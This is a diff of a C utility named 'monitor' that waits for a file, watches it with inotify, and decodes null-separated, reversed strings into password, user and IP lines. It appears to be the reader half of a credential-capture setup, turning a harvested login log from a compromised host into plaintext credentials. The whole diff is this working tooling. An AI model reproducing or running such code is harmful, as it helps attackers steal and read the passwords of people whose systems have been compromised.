@@ -1,100 +1,125 @@
 #include <sys/inotify.h>
-#include <sys/poll.h>
 #include <sys/types.h>
+
 #include <fcntl.h>
 #include <unistd.h>
 #include <string.h>
 #include <stdlib.h>
 #include <stdio.h>
+#include <poll.h>
+#include <string.h>
+#include <errno.h>
 
 static const char *fields[]={
-    "PASSWORD=",
-    "RHOST=",
-    "USER="
+	"password",
+	"user",
+	"ip"
 };
 
-int main(int argc, char **argv){
-    struct inotify_event event;
-    struct pollfd pfd;
+int wait_file(const char *filename)
+{
+	int fd;
 
-    ssize_t i, j, k, n;
-    int nfd, fd, start;
+	while ((fd = open(filename, O_RDONLY)) == -1) {
+		if (errno != ENOENT) {
+			printf("can't open %s - %s\n", filename, strerror(errno));
+			exit(1);
+		}
 
-    char buf[1024];
+		sleep(1);
+	}
 
-    if(argc != 2){
-        printf("monitor [filename]\n");
-        return 1;
-    }
+	return fd;
+}
 
-    fd = open(argv[1], O_RDONLY|O_APPEND);
-    if(fd == -1){
-        perror("open()");
-        return 1;
-    }
+void strrev(char *str, int len)
+{
+	char aux;
+	int i;
 
-    lseek(fd, 0, SEEK_END);
+	for (i = 0; i < len/2; i++) {
+		aux = str[i];
+		str[i] = str[len - i - 1];
+		str[len - i - 1] = aux;
+	}
+}
 
-    nfd = inotify_init();
+void get_creds(char *data, int n)
+{
+	static int size, type, j;
+	static char *buf;
+
+	if (data == NULL && buf) {
+		strrev(buf, j);
+		j = 0;
+
+		printf("%s=%s\n", fields[type], buf);
+		type = (type + 1) % 3;
+		return;
+	}
+
+	for (int i = 0; i < n; i++) {
+		if (data[i] == 0x0 && j) {
+			strrev(buf, j);
+			j = 0;
+
+			printf("%s=%s\n", fields[type], buf);
+			type = (type + 1) % 3;
+		}
+
+		if (j >= size) {
+			size += 128;
+			buf = realloc(buf, size);
+		}
+
+
+		buf[j++] = data[i];
+	}
+
+}
+
+int main(int argc, char **argv)
+{
+	struct inotify_event event;
+	struct pollfd pfd;
+	char buf[8192];
+	ssize_t n;
+
+	int fd, nfd;
+
+	if (argc != 2) {
+		printf("monitor [filename]\n");
+		return 1;
+	}
+
+	fd = wait_file(argv[1]);
+
+	nfd = inotify_init();
     inotify_add_watch(nfd, argv[1], IN_MODIFY);
 
-    pfd.fd = nfd;
-    pfd.events = POLLIN;
+	pfd.fd = nfd;
+	pfd.events = POLLIN;
 
-    start = 1;
-    k = 0;
+	goto print_creds;
 
-    while(poll(&pfd, 1, -1) != -1){
-        if(read(nfd, &event, sizeof(struct inotify_event)) <= 0){
-            perror("read()");
-            return 1;
-        }
+	while (poll(&pfd, 1, -1) != -1) {
+		if (read(nfd, &event, sizeof(event)) != sizeof(event)){
+			perror("read()");
+			return 1;
+		}
 
-        if(!(event.mask & IN_MODIFY)){
-            perror("invalid event ...");
-            return 1;
-        }
+		if (!(event.mask & IN_MODIFY)) {
+			perror("invalid event ...");
+			return 1;
+		}
 
-        while(1){
-            n = read(fd, buf, sizeof(buf));
-            if(n == -1){
-                perror("read()");
-                return 1;
-            } else if(n == 0){
-                break;
-            }
+print_creds:
+		while ((n = read(fd, buf, sizeof(buf))) > 0) {
+			get_creds(buf, n);
+		}
 
-            i = 0;
+		get_creds(NULL, 0);
+	}
 
-            while(i<n){
-                if(start){
-                    write(1, fields[k], strlen(fields[k]));
-                    start = 0;
-                    k++;
-                }
-
-                j = i;
-                for(; i<n; i++){
-                    if(buf[i] == 0x0){
-                        start = 1;
-                        i++;
-
-                        break;
-                    }
-                }
-
-                write(1, buf+j, i-j);
-                if(start){
-                    write(1, "\n", 1);
-                    if(k == 3){
-                        write(1, "\n", 1);
-                        k = 0;
-                    }
-                }
-
-            }
-        }
-    }
-
-    return 0;
+	return 0;
 }
